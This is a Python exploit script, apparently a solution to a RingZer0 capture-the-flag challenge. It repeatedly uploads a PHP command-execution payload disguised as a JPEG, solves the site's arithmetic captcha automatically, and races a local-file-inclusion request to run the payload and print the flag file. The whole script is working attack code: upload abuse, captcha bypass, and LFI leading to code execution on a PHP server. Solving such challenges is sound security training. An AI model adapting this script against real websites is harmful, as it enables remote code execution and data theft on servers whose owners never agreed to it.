#!/usr/bin/env python3

import requests
import threading

PAYLOAD = '<?php echo system("cat *flag*"); ?>'
HOST = "challenges.ringzer0team.com:10337"

r = requests.head(f"http://{HOST}/")
cookies = r.cookies
sessid = cookies["PHPSESSID"]
exploit_url = f"http://{HOST}/index.php?file=uploads/{sessid}/test.jpg"


def upload_loop(cookies):
    t = threading.currentThread()
    s = requests.Session()
    s.cookies = cookies
    r = s.get(f"http://{HOST}/index.php?file=upload.php")
    captcha = r.content.split(b'placeholder="')[1].split(b'"')[0]
    a, b = [int(n) for n in captcha.split(b" + ")]

    while t.keep_running:
        files = {"file": ("test.jpg", PAYLOAD, "image/jpeg")}
        data = {"captcha": str(a + b)}
        r = s.post(f"http://{HOST}/index.php?file=upload.php", data=data, files=files)
        captcha = r.content.split(b'placeholder="')[1].split(b'"')[0]
        a, b = [int(n) for n in captcha.split(b" + ")]


t = threading.Thread(target=upload_loop, args=(cookies,))
t.keep_running = True
t.start()

s = requests.Session()
s.cookies = cookies
while True:
    r = s.get(exploit_url)
    if len(r.content) > 0:
        print(r.content.decode())
        t.keep_running = False
        break
